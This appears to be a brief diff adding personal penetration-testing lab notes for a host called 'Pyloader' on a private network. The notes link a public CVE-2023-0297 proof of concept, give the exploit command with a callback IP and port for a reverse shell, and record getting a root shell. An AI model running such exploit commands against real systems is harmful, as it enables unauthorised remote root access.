@@ -1,0 +1,10 @@
+192.168.171.26
+Pyloader
+
+http://192.168.171.26:9666
+https://github.com/JacobEbben/CVE-2023-0297
+
+python3 exploit.py -t http://192.168.171.26:9666 -I 192.168.45.173 -P 4545
+check listner
+got shell as root user
+
